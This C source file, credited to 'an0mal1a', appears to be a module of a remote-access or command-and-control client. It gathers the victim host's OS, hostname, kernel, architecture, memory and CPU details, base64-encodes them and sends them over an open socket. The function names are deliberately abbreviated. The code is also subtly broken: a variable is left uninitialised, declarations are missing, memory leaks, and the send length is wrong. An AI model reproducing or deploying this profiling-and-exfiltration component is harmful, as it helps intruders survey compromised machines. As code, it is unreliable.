#include <sys/utsname.h>
#include <sys/sysinfo.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>

char* getSytmIfrtn();
char* encdeStm(char* systemInfo);
int srtSysInfo(int conn);

/*

  Creado por "an0mal1a"

       https://github.com/an0mal1a

*/

char* getSytmIfrtn(){
    char* info = malloc(1000 * sizeof(char)); 
    info[0] = '\0';

    // Información del sistema operativo
    struct utsname buffer;
    uname(&buffer);
    sprintf(info + strlen(info), "\n\tOS name:   %s\n\n", buffer.sysname);
    sprintf(info + strlen(info), "| PC Name:\t %s\n", buffer.nodename);
    sprintf(info + strlen(info), "| kernel info:\t %s\n", buffer.release);
    sprintf(info + strlen(info), "| Architecture:\t %s\n", buffer.machine);
    sprintf(info + strlen(info), "| OS version:\t %s\n", buffer.version);

    // Información de la memoria
    struct sysinfo memInfo;
    sysinfo(&memInfo); 
    sprintf(info + strlen(info), "| Free RAM:\t %lu MB\n", memInfo.freeram / (1024 * 1024));
    sprintf(info + strlen(info), "| Total RAM:\t %lu MB\n\n\n", memInfo.totalram / (1024 * 1024)); // En MB

    // Información del procesador
    FILE *cpuinfo = fopen("/proc/cpuinfo", "rb");
    char *arg = 0;
    size_t size = 0;
    bool model, vendor = false;

    while(getline(&arg, &size, cpuinfo) != -1 && (!model || !vendor)) {
        if (strstr(arg, "model name") != NULL) {
            model = true;
            sprintf(info + strlen(info), "| %s", arg);
        } else if (strstr(arg, "vendor_id") != NULL){
            vendor = true;
            sprintf(info + strlen(info), "| %s", arg);
        }
    }
    
    free(arg);
    fclose(cpuinfo);

    return info; // Devuelve la información recopilada
}


char* encdeStm(char* systemInfo){
    char* systemInfoEncode = malloc(strlen(systemInfo) + 1);

    long size = strlen(systemInfo);
    systemInfoEncode = base64_encode(systemInfo, size, &size);
    //printf("%s", systemInfoEncode);
    
    return systemInfoEncode;

}

int srtSysInfo(int conn){
    char* systemInfo = getSytmIfrtn();

    send(conn, encdeStm(systemInfo), strlen(systemInfo), 0);

    free(systemInfo);  
}

